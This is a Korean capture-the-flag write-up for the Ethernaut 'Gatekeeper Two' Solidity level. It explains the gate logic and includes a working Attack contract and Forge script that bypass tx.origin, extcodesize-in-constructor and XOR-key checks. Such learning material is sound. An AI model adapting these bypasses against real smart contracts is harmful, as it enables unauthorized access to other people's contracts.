# Gatekeeper Two — 정리된 풀이

목표
- `enter(bytes8 _gateKey)` 호출을 통해 `entrant = tx.origin` 이 되도록 하여 레벨을 통과합니다.

문제 코드

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

한눈에 보는 전략
- gateOne: `msg.sender != tx.origin` — EOA가 직접 호출하면 실패하므로 중계(EOA → 공격 컨트랙트 → target) 방식으로 호출해야 합니다.
- gateTwo: `extcodesize(caller()) == 0` — 호출자(caller)의 코드 크기가 0이어야 합니다. 생성자(constructor) 내부에서 외부 계약을 호출하면, 호출 당시 생성 중인 컨트랙트의 코드는 아직 체인에 배치되지 않아 `extcodesize == 0`이 됩니다. 따라서 공격 컨트랙트의 생성자에서 `enter`를 호출하면 gateTwo를 통과할 수 있습니다.
- gateThree: `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max` — `msg.sender`(공격 컨트랙트 주소)를 keccak256으로 해시한 하위 8바이트를 얻어, 이를 XOR한 결과가 모든 비트가 1인 `uint64` 최대값이 되어야 합니다. 즉, `_gateKey`는 해시 하위 8바이트의 비트를 뒤집은 값(bitwise NOT)이어야 합니다.

구현 포인트
1) gateOne 해결: 공격 트랜잭트를 EOA가 공격 컨트랙트의 생성자(또는 함수)로 시작하면 `msg.sender`가 공격 컨트랙트가 되고 `tx.origin`은 EOA가 됩니다. 생성자에서 target을 호출하면 gateOne 통과.
2) gateTwo 해결: 생성자 내부에서 호출하면 `extcodesize(caller())`는 0이 됩니다(생성 중인 컨트랙트는 아직 코드가 배치되지 않음). 따라서 생성자에서 `enter`를 호출해야 함.
3) gateThree 해결: gateKey는 다음과 같이 계산하면 됩니다.

```solidity
bytes8 gateKey = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
```

설명: `keccak256(abi.encodePacked(address(this)))`의 하위 8바이트(`bytes8`)를 `uint64`로 해석한 뒤 비트 반전(`~`)하면, XOR 연산을 통해 `type(uint64).max`가 됩니다.

공격 컨트랙트 (생성자에서 바로 호출하는 방식)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    constructor(address _target) {
        // gateKey 계산: target을 호출하는 시점의 this 주소(공격 컨트랙트)를 사용
        bytes8 gateKey = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));

        // 생성자에서 바로 호출: 이 호출 시점의 caller()는 생성 중인 Attack 컨트랙트이고, extcodesize == 0
        (bool success, ) = _target.call(abi.encodeWithSignature("enter(bytes8)", gateKey));

        // 선택적: 다시 인터페이스로 호출(성공 여부 확인용)
        // IGatekeeperTwo(_target).enter(gateKey);
    }
}
```

사용 예시 (Forge script)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Attack.sol";

contract GatekeeperTwoScript is Script {
    function run() external {
        vm.startBroadcast();
        // target 주소를 넣고 배포하면 생성자에서 자동으로 enter 호출 시도
        new Attack(0xYourTargetAddress);
        vm.stopBroadcast();
    }
}
```

팁 및 주의사항
- `extcodesize`는 컨트랙트 생성자 내부에서의 호출 시 0을 반환합니다. 이는 생성 중인 컨트랙트의 코드가 아직 체인에 올라가지 않았기 때문입니다.
- gateTwo를 생성자 방식으로 해결하면 gateOne도 자연스럽게 해결됩니다(생성자 호출의 `tx.origin`은 EOA, `msg.sender`는 생성 중인 컨트랙트).
- gateThree용 `gateKey`는 공격 컨트랙트의 주소(`address(this)`)를 기준으로 계산해야 합니다. 로컬에서 테스트할 때는 배포된(또는 배포될) 주소를 미리 알기 어렵지만, 생성자 내부에서 `address(this)`를 사용하면 정확한 값이 계산됩니다.
- 로컬에서 반복/디버깅 시, 로그와 이벤트를 활용해 `enter` 호출의 `success` 여부를 확인하세요.

결론
- Gatekeeper Two는 gate들의 상호작용(특히 `extcodesize`와 생성자 호출 타이밍)과 비트 연산을 이해하면 해결됩니다. 위의 공격 컨트랙트(생성자에서 계산 및 호출하는 방식)로 레벨을 통과할 수 있습니다.
